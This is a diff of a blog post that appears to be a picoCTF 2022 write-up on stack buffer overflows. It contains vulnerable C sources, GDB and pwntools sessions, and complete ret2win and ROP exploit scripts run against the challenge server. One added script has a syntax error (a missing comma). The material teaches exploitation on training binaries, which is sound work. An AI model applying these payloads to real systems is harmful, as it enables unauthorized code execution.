@@ -36,6 +36,17 @@ thumbnail: /asset/banner/banner-buffer-overflow.png
         text-align: center;
     }
 
+    .info {
+        border: 1px solid #35678C;
+        border-radius: 5px;
+        background-color: #35678C;
+        padding: 1rem;
+        font-size: 90%;
+        text-align: center;
+        margin-top: 1rem;
+        margin-bottom: 1rem;
+    }
+
     .no-highlight {
         user-select: none;
         -moz-user-select: none;
@@ -75,9 +86,10 @@ This is a writeup for the buffer overflow series during the **picoCTF 2022** com
 </figure>
 
 
-Let's analyze this `.c` file we have as reference:
+Let's check out our source code:
 
-```c
+{% codeblock vuln-0.c lang:c https://enscribe.dev/asset/pico/buffer-overflow-0-1/vuln-0.c <span style="color:#82C4E4">[download source]</span> %}
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -123,7 +135,7 @@ int main(int argc, char **argv){
   return 0;
 }
 
-```
+{% endcodeblock %}
 
 The first thing we should do is check how the flag is printed. Looks like it's handled in a `sigsegv_handler()` function:
 
@@ -150,7 +162,6 @@ We see that on line 40, the horrible `gets()` is called, and reads `buf1` (the u
     </tr>
   </table>
 </figure>
-
 
 ---
 
@@ -182,7 +193,7 @@ We see that on line 40, the horrible `gets()` is called, and reads `buf1` (the u
 
 Let's check out our source code:
 
-```c
+{% codeblock vuln-1.c lang:c https://enscribe.dev/asset/pico/buffer-overflow-0-1/vuln-1.c <span style="color:#82C4E4">[download source]</span> %}
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -224,7 +235,7 @@ int main(int argc, char **argv){
   vuln();
   return 0;
 }
-```
+{% endcodeblock %}
 
 In the `vuln()` function, we see that once again, the `gets()` function is being used. However, instead of triggering a segmentation fault like <kbd>Buffer overflow 0</kbd>, we will instead utilize its vulnerability to write our own addresses onto the stack, changing the return address to `win()` instead.
 
@@ -279,7 +290,7 @@ Breakpoint 1, <span style="color:#367BF0">0x080492d7</span> in <span style="colo
 <span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
 [<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x80492d7</span> in <span style="color:#FF8A18"><b>main</b></span> (), reason: <span style="color:#962AC3"><b>BREAKPOINT</b></span></pre></td></tr></table></figure>
 
-Analyzing this breakpoint, if you look at the arrow on the assembly code, you can see that its address is the exact same as the `$eip` (`0x80492d7`). Let's try overflowing this register by passing an unhealthy amount of `A`s into the program:
+Analyzing this breakpoint, if we look at the arrow on the assembly code, we can see that its address is the exact same as the `$eip` (`0x80492d7`). Let's try overflowing this register by passing an unhealthy amount of `A`s into the program:
 
 <figure class="highlight text"><table> <tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>r
 Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
@@ -309,7 +320,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 <div style="margin-top:-2.5%; margin-bottom:2.5%;">Look what happened: our program threw a SIGSEGV (segmentation) fault, as it is trying to reference the address <code>0x41414141</code>, which doesn&#39;t exist! This is because our <code>$eip</code> was overwritten by all our <code>A</code>s (<code>0x41</code> in hex = <code>A</code> in ASCII).</div>
 
-### Part III: Smashing the Stack (with finesse)
+### Part III: Finessing the Stack
 
 Although we've managed to smash the stack, we still dont' know the offset (**how many** `A`s we need to pass in order to reach the `$eip`). To solve this problem, we can use the pwntools `cyclic` command, which creates a string with a recognizable cycling pattern for it to identify:
 
@@ -399,20 +410,23 @@ Let's make a final visual of our payload:
 
 Let's write our payload and send it to the remote server with Python3/pwntools:
 
-<figure class="highlight py">
-  <figcaption><span>buffer-overflow-1.py</span><a target="_blank" rel="noopener"
-      href="https://gist.github.com/jktrn/23ec53b007e3589c6793acffce207394"><span style="color:#82C4E4">[github gist link]</span></a></figcaption>
-  <table><tr><td class="gutter">
-        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
-      </td>
-      <td class="code">
-        <pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">44</span> + p32(<span class="number">0x80491f6</span>)  <span class="comment"># Little endian: b&#x27;\xf6\x91\x04\x08&#x27;</span></span><br><span class="line">host, port = <span class="string">&quot;saturn.picoctf.net&quot;</span>, [PORT]</span><br><span class="line"></span><br><span class="line">p = remote(host, port)      <span class="comment"># Opens the connection</span></span><br><span class="line">log.info(p.recvS())         <span class="comment"># Decodes/prints &quot;Please enter your string:&quot;</span></span><br><span class="line">p.sendline(payload)         <span class="comment"># Sends the payload</span></span><br><span class="line">log.success(p.recvallS())   <span class="comment"># Decodes/prints all program outputs</span></span><br><span class="line">p.close()                   <span class="comment"># Closes the connection</span></span><br></pre>
-</td></tr></table></figure>
+{% codeblock lang:py buffer-overflow-1.py https://gist.github.com/jktrn/23ec53b007e3589c6793acffce207394 <span style="color:#82C4E4">[github gist link]</span> %}
+from pwn import *
+
+payload = b"A"*44 + p32(0x80491f6)  # Little endian: b'\xf6\x91\x04\x08'
+host, port = "saturn.picoctf.net", [PORT]
+
+p = remote(host, port)      # Opens the connection
+log.info(p.recvS())         # Decodes/prints "Please enter your string:"
+p.sendline(payload)         # Sends the payload
+log.success(p.recvallS())   # Decodes/prints all program outputs
+p.close()                   # Closes the connection
+{% endcodeblock %}
 
 Let's try running the script on the server:
 
 <figure class="highlight text"><table><tr><td class="code">
-<pre><span class="meta prompt_">$ </span>python3 exp2.py
+<pre><span class="meta prompt_">$ </span>python3 buffer-overflow-1.py
 [<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
 [<span style="color:#277FFF"><b>*</b></span>] Please enter your string: 
 [<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (100B)
@@ -421,7 +435,327 @@ Let's try running the script on the server:
     picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}
 </pre></td></tr></table></figure>
 
+We have completed our first `ret2win` buffer overflow on a x32 binary! Yet, this is just the beginning. How about we spice things up a little bit?
 
-You have completed your first `ret2win` buffer overflow on a x32 binary!
+### Part IV: Automating the Stack
+
+Although the concept of buffer overflows can seem daunting to newcomers, experienced pwners will often find these sorts of challenges trivial, and don't want to spend the effort manually finding offsets and addresses just to send the same type of payload. This is where our best friend comes in: **pwntools** helper functions and automation! Let's start with the first part - the `$eip` offset for x32 binaries.
+
+The main helper we will be using is [`pwnlib.elf.corefile`](https://docs.pwntools.com/en/stable/elf/corefile). It can parse [core dump](https://www.ibm.com/docs/en/aix/7.1?topic=formats-core-file-format) files, which are generated by Linux whenever errors occur during a running process. These files take an **image** of the process when the error occurs, which may assist the user in the debugging process. Remember when we sent a large `cyclic` pattern which was used to cause a segmentation fault? We'll be using the core dump to view the state of the registers during that period, without needing to step through it using GDB. We'll be using the coredump to eventually find the offset!
+
+<div class="info">
+<i class="fa-solid fa-circle-info"></i> Info: Many Linux systems do not have core dumps properly configured. For bash, run <code>ulimit -c unlimited</code> to generate core dumps of unlimited size. For tsch, run <code>limit coredumpsize unlimited</code>. By default, cores are dumped into either the current directory or <code>/var/lib/systemd/coredump</code>.
+</div>
+
+Before we start, let's work through the steps with command-line Python. First, let's import the pwntools global namespace and generate an `elf` object using pwntool's `ELF()`:
+
+<figure class="highlight plaintext"> <table> <tr> <td class="code"> <pre><span class="line"><span class="meta prompt_">$ </span>python3 -q</span><br><span class="meta prompt_">&gt;&gt;&gt;</span> from pwn import *
+<span class="meta prompt_">&gt;&gt;&gt;</span> elf = context.binary = ELF('./vuln')
+[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#D41919">NX disabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
+    RWX:      <span style="color:#D41919">Has RWX segments</span>
+</pre> </td></tr></table></figure>
+
+We can then generate a `cyclic()` payload and start a local process referencing the aforementioned `elf` object. Sending the payload and using the [`.wait()`](https://www.educba.com/python-wait/) method will throw an exit code -11, which signals a segmentation fault and generates a core dump. 
+
+<figure class="highlight plaintext"> <table> <tr> <td class="code"> <pre style="white-space: pre-wrap"><span class="meta prompt_">&gt;&gt;&gt;</span> p = process(elf.path)
+[<span style="color:#9755B3">x</span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2219
+<span class="meta prompt_">&gt;&gt;&gt;</span> p.sendline(cyclic(128))
+<span class="meta prompt_">&gt;&gt;&gt;</span> p.wait()
+[<span style="color:#277FFF"><b>*</b></span>] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2219)
+<span class="meta prompt_">&gt;&gt;&gt;</span> exit()
+<span class="meta prompt_">$ </span>ls -al
+total 2304
+drwxr-xr-x  3 kali kali    4096 Jun 16 15:35 <span style="color:#277FFF"><b>.</b></span>
+drwxr-xr-x 16 kali kali    4096 Jun 14 17:13 <span style="color:#277FFF"><b>..</b></span>
+-rw-------  1 kali kali 2588672 Jun 16 15:35 core
+-rw-r--r--  1 kali kali     358 Jun 16 03:22 buffer-overflow-1.py
+-rwxr-xr-x  1 kali kali   15704 Mar 15 02:45 <span style="color:#47D4B9"><b>vuln</b></span>
+-rw-r--r--  1 kali kali     769 Mar 15 02:45 vuln.c
+</pre> </td></tr></table></figure>
+
+We can now create a corefile object and freely reference registers! To find the offset, we can simply call the object key within `cyclic_find()`.
+
+<figure class="highlight plaintext"> <table> <tr> <td class="code"><pre style="white-space: pre-wrap"><span class="meta prompt_">>>></span> core = Corefile('./core')
+[<span style="color:#9755B3">x</span>] Parsing corefile...
+[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/core'
+    Arch:      i386-32-little
+    EIP:       0x6161616c
+    ESP:       0xff93abe0
+    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' (0x8048000)
+    Fault:     0x6161616c
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+<span class="meta prompt_">>>></span> core.registers
+{'eax': 65, 'ebp': 1633771883, 'ebx': 1633771882, 'ecx': 65, 'edi': 134516960, 'edx': 4294967295, 'eflags': 66178, 'eip': 1633771884, 'esi': 1, 'esp': 4287867872, 'orig_eax': 4294967295, 'xcs': 35, 'xds': 43, 'xes': 43, 'xfs': 0, 'xgs': 99, 'xss': 43}
+<span class="meta prompt_">>>></span> hex(core.eip)
+'0x6161616c'
+</pre></td></tr></table></figure>
+</figure>
+
+Now that we know how ELF objects and core dumps work, let's apply them to our previous script. Another cool helper I would like to implement is [`flat()`](https://docs.pwntools.com/en/stable/util/packing.html), which flattens arguments given in lists, tuples, or dictionaries into a string with `pack()`. This will help us assemble our payload without needing to concatenate seemingly random strings of `A`s and little-endian addresses, increasing readability.
+
+This is my final, completely automated script:
+
+{% codeblock lang:py buffer-overflow-1-automated.py https://gist.github.com/jktrn/b1586f403c6ae31ce0e128b8f96faad6 <span style="color:#82C4E4">[github gist link]</span> %}
+from pwn import *
+
+elf = context.binary = ELF('./vuln', checksec=False)    # sets elf object
+host, port = 'saturn.picoctf.net', [PORT]
+
+p = process(elf.path)        # references elf object
+p.sendline(cyclic(128))      # sends cyclic pattern to crash
+p.wait()                     # sigsegv generates core dump
+core = Coredump('./core')    # parse core dump file
+
+payload = flat({
+    cyclic_find(core.eip): elf.symbols.win    # offset:address
+})
+
+if args.REMOTE:    # remote process if arg
+    p = remote(host, port)
+else:
+    p = process(elf.path)
+
+p.sendline(payload)
+p.interactive()    # receives flag
+{% endcodeblock %}
+
+Let's run the script on the server:
+
+<figure class="highlight plaintext"> <table> <tr> <td class="code"><pre style="white-space: pre-wrap"><span class="meta prompt_">$ </span>python3 buffer-overflow-1-automated.py REMOTE
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2601
+[<span style="color:#277FFF"><b>*</b></span>] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2601)
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/core'
+    Arch:      i386-32-little
+    EIP:       0x6161616c
+    ESP:       0xff829260
+    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' (0x8048000)
+    Fault:     0x6161616c
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}[<span style="color:#277FFF"><b>*</b></span>] Got EOF while reading in interactive
+</pre></td></tr></table></figure>
+
+We've successfully automated a solve on a simple x32 buffer overflow!
+
+---
+
+## Buffer overflow 2
+
+<div class="box no-highlight">
+  Control the return address and arguments<br>This time you'll need to control the arguments to the function you return to! Can you get the flag from this  <a href="/asset/pico/buffer-overflow-0-1/vuln-2">program</a>?<br>You can view source <a href="/asset/pico/buffer-overflow-0-1/vuln-2.c">here</a>. And connect with it using  <code>nc saturn.picoctf.net [PORT]</code>
+<br><br>
+  <b>Authors</b>: Sanjay C., Palash Oswal
+  <details><summary><b>Hints:</b></summary><br>1. Try using GDB to print out the stack once you write to it.</details>
+</div>
+
+<div class="warning">
+<i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <b>instance-based</b> challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
+</div>
+
+Let's check out our source code:
+
+{% codeblock vuln-2.c lang:c https://enscribe.dev/asset/pico/buffer-overflow-0-1/vuln-2.c <span style="color:#82C4E4">[download source]</span> %}
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+#define BUFSIZE 100
+#define FLAGSIZE 64
+
+void win(unsigned int arg1, unsigned int arg2) {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  if (arg1 != 0xCAFEF00D)
+    return;
+  if (arg2 != 0xF00DF00D)
+    return;
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+  puts(buf);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+{% endcodeblock %}
+
+Looking at the `win()` function, we can see that two arguments are required that need to be passed into the function to receive the flag. Two guard clauses lay above the flag print:
+
+{% codeblock lang:c first_line:19 %}
+  fgets(buf,FLAGSIZE,f);
+  if (arg1 != 0xCAFEF00D)
+    return;
+  if (arg2 != 0xF00DF00D)
+    return;
+  printf(buf);
+{% endcodeblock %}
+
+The goal is simple: call `win(0xCAFEF00D, 0xF00DF00D)`! We'll be doing it the hard way (for a learning experience), in addition to a more advanced easy way. Let's get started.
+
+### Part I: The Hard Way
+
+We can apply a lot from what we learned in `Buffer overflow 1`. The first thing we should do is find the offset, which requires no hassle with pwntools helpers! Although we'll get actual number here, I won't include it in the final script for the sake of not leaving out any steps. Simply segfault the process with a cyclic string, read the core dump's fault address (`$eip`) and throw it into `cyclic_find()`:
+
+<figure class="highlight plaintext"> <table> <tr> <td class="code"><pre style="white-space: pre-wrap"><span class="meta prompt_">$ </span>python3 -q
+<span class="meta prompt_">&gt;&gt;&gt; </span>from pwn import *
+<span class="meta prompt_">&gt;&gt;&gt; </span>elf = context.binary = ELF(&apos;./vuln&apos;)
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#5EBDAB">NX enabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
+<span class="meta prompt_">&gt;&gt;&gt; </span>p = process(elf.path)
+[<span style="color:#9755B3">x</span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 2777
+<span class="meta prompt_">&gt;&gt;&gt; </span>p.sendline(cyclic(128))
+<span class="meta prompt_">&gt;&gt;&gt; </span>p.wait()
+[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 2777)
+<span class="meta prompt_">&gt;&gt;&gt; </span>core = Corefile(&apos;./core&apos;)
+[<span style="color:#9755B3">x</span>] Parsing corefile...
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
+    Arch:      i386-32-little
+    EIP:       0x62616164
+    ESP:       0xffafca40
+    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
+    Fault:     0x62616164
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+<span class="meta prompt_">&gt;&gt;&gt; </span>cyclic_find(0x62616164)
+112
+</pre></td></tr></table></figure>
+
+The next thing we need to know about is the way functions are laid out on the stack. Let's recall the diagram I drew out earlier:
+
+![Stack Diagram](/asset/pico/buffer-overflow-0-1/stack-visual2.png)
+
+If we want to call a function with parameters, we'll need to include the base pointer alongside a return address, which can simply be `main()`. With this, we can basically copy our script over from `Buffer overflow 1` with a few tweaks to the payload:
+
+{% codeblock buffer-overflow-2.py lang:py https://gist.github.com/jktrn/c6c17fc63ca801d0b64d8bb5acc982c1 <span style="color:#82C4E4">[github gist link]</span> %}
+from pwn import *
+
+elf = context.binary = ELF('./vuln', checksec=False)    # sets elf object
+host, port = 'saturn.picoctf.net', [PORT]
+
+p = process(elf.path)        # creates local process w/ elf object
+p.sendline(cyclic(128))      # sends cyclic pattern to crash
+p.wait()                     # sigsegv generates core dump
+core = Coredump('./core')    # parses core dump file
+
+payload = flat([
+    {cyclic_find(core.eip): elf.symbols.win},    # pads win address
+    elf.symbols.main,                            # return address
+    0xCAFEF00D,                                  # parameter 1
+    0xF00DF00D                                   # parameter 2
+])
+
+if args.REMOTE:
+    p = remote(host, port)
+else:
+    p = process(elf.path)
+
+p.sendline(payload)
+p.interactive()
+{% endcodeblock %}
+
+Let's run it on the remote server:
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 buffer-overflow-2.py REMOTE
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 3988
+[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
+-11 (SIGSEGV) (pid 3988)
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
+    Arch:      i386-32-little
+    EIP:       0x62616164
+    ESP:       0xffca3290
+    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
+    Fault:     0x62616164
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
+Please enter your string: 
+\xf0\xfe\xcadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua-<br>aaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04r\x93\x04
+picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}
+</pre></td></tr></table></figure>
+
+### Part II: The Easy Way
+
+But... what if you wanted to be an even **more** lazy pwner? Well, you're in luck, because I present to you: the **[pwntools ROP object](https://docs.pwntools.com/en/stable/rop/rop.html)**! By throwing our elf object into `ROP()` it transforms, and we can use it to automatically call functions and build chains! Here it is in action:
+
+{% codeblock buffer-overflow-2-automated.py lang:py https://gist.github.com/jktrn/a5bfe03bdf5b2d766ef5fa402e9e35d6 <span style="color:#82C4E4">[github gist link]</span> %}
+from pwn import *
+
+elf = context.binary = ELF('./vuln' checksec=False)    # sets elf object
+rop = ROP(elf)                                         # creates ROP object
+host, port = 'saturn.picoctf.net', [PORT]
+
+p = process(elf.path)        # creates local process w/ elf object
+p.sendline(cyclic(128))      # sends cyclic pattern to crash
+p.wait()                     # sigsegv generates core dump
+core = Coredump('./core')    # parses core dump file
+
+rop.win(0xCAFEF00D, 0xF00DF00D)                        # Call win() with args
+payload = fit({cyclic_find(core.eip): rop.chain()})    # pad ROP chain
+
+if args.REMOTE:
+    p = remote(host, port)
+else:
+    p = process(elf.path)
+
+p.sendline(payload)
+p.interactive()
+{% endcodeblock %}
+
+Let's run it on the remote server:
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 buffer-overflow-2-automated.py REMOTE
+[<font color="#277FFF"><b>*</b></font>] Loaded 10 cached gadgets for &apos;./vuln&apos;
+[<font color="#47D4B9"><b>+</b></font>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 4993
+[<font color="#277FFF"><b>*</b></font>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
+-11 (SIGSEGV) (pid 4993)
+[<font color="#47D4B9"><b>+</b></font>] Parsing corefile...: Done
+[<font color="#277FFF"><b>*</b></font>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
+    Arch:      i386-32-little
+    EIP:       0x62616164
+    ESP:       0xffd07fc0
+    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
+    Fault:     0x62616164
+[<font color="#47D4B9"><b>+</b></font>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<font color="#277FFF"><b>*</b></font>] Switching to interactive mode
+Please enter your string: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaa-
+avaaawaaaxaaayaaazaabbaabcaab\x96\x\xf0\xfe\xca
+picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}<font color="#EC0101"><b>$</b></font> [<font color="#277FFF"><b>*</b></font>] Got EOF while reading in interactive
+</pre></td></tr></table></figure>
+
 
 <a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
